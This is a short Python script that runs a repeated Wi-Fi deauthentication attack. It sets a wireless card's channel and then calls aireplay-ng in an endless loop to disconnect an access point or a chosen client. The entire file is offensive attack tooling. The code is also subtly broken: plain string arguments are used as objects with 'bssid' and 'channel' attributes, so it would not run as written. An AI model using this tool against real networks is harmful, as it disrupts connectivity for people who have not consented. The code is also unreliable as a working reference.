import subprocess
import time
import os
import sys
import argparse
import multiprocessing
import logging


class DeauthAttacker(multiprocessing.Process):
    def __init__(self, iface, ap, client=None):
        multiprocessing.Process.__init__(self)
        self._sleep_time = 10
        self._run = True
        self._target = ap
        self._iface = iface
        self._cmd = ["/usr/sbin/aireplay-ng", "--ignore-negative-one",
                     "--deauth", "5",
                     "-a", str(ap.bssid)]

        if client:
            self._cmd.append("-c")
            self._cmd.append(str(client.bssid))

        self._cmd.append(iface)

    def _set_channel(self):
        channel = str(self._target.channel)
        sc = subprocess.Popen(["iwconfig", self._iface, "channel", channel],
                              stdout=open(os.devnull, 'w'),
                              stderr=subprocess.STDOUT, shell=False)
        sc.wait()

    def run(self):
        self._set_channel()
        while self._run:
            logging.info("attack!")
            attacker = subprocess.Popen(self._cmd, stdout=open(os.devnull, 'w'),
                                        stderr=subprocess.STDOUT, shell=False)
            attacker.wait()
            time.sleep(self._sleep_time)


def main(args):
    parser = argparse.ArgumentParser()
    parser.add_argument("iface")
    parser.add_argument("ap", type=str)
    parser.add_argument("--sta", type=str)
    parsed = parser.parse_args(args[1:])

    if parsed.sta:
        d = DeauthAttacker(parsed.iface, parsed.ap, client=parsed.sta)
    else:
        d = DeauthAttacker(parsed.iface, parsed.ap)

    d.start()

if __name__ == "__main__":
    sys.exit(main(sys.argv))
